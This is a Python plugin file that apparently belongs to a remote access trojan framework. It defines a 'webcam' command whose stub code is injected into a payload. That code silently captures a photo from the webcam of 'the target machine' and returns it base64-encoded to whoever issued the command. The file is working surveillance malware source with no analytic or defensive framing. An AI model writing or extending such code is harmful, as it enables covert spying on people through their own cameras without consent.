PLUGIN = {"name": "webcam", "desc": "Capture webcam photo (requires opencv-python)", "deps": ["opencv-python"], "size": 0.6}

STUB_CODE = r"""
def _cmd_webcam(m):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return {"output": "[!] No webcam found"}
        ret, frame = cap.read()
        cap.release()
        if not ret: return {"output": "[!] Capture failed"}
        _, buf = cv2.imencode(".jpg", frame)
        return {"data": base64.b64encode(buf.tobytes()).decode()}
    except ImportError:
        return {"output": "[!] Webcam requires opencv-python-headless on the target machine. Install: pip install opencv-python-headless"}
    except Exception as e:
        return {"output": f"[!] Webcam: {e}"}
_CMDS["webcam"] = _cmd_webcam
"""

def get_commands():
    return {"webcam": "_cmd_webcam"}
